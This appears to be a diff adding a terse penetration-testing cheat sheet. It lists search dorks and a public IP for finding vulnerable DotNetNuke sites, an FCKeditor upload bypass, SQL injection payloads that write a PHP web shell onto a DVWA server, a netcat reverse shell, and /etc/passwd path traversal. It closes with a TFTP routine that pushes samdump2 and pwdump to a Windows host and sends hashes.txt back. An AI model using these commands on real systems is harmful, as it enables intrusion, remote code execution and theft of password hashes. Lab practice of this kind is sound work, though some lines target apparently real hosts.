@@ -1,0 +1,41 @@
+http://139.99.172.99/index.php?page=http://www.google.com/?
+ip:103.77.78.230 .php?id=
+inurl:/tabid/36/language/en-US/Default.aspx
+inurl:fcklinkgallery.aspx
+inurl:/portals/0/
+
+Replace: 
+home/tabid/36/language/en-US/Default.aspx 
+with:
+Providers/HtmlEditorProviders/Fck/fcklinkgallery.aspx
+
+Ctrl + Shift + K 
+javascript:_doPostBack('ctlURL$cmdUpload','')
+
+select first_name, surname from users where user_id='';
+' order by 3 #
+<?php system($_GET["cmd"]); ?>
+' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/dvwa/cmd.php' #
+' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/dvwa/cmd.php' #
+nc -lvp 1234
+nc 172.16.1.100 1234 -e /bin/sh
+ /etc/passwd
+ /var/www/cgi-bin/things/
+ ../../../../../../../../../../../../../../etc/passwd
+ 
+ service atftpd start
+ mkdir /tftpboot
+ leafpad /etc/default/atftpd
+ USE_INETD=false
+ OPTIONS="--tftpd-timeout 300 --retry-timeout 5
+ --maxthread 100 --verbose=5 --daemon --port 69 /tftpboot"
+ 
+  /etc/init.d/atftpd restart
+   cd /usr/bin
+   cp samdump2 /tftpboot
+   cp pwdump /tftpboot
+   nc 192.168.1.121 6996
+   C:\> tftp -i GET 192.168.1.119 samdump2
+   C:\dir
+   C:\> tftp -i GET 192.168.1.119 pwdump
+   C:/tftp -i PUT 192.168.1. 119 hashes.txt
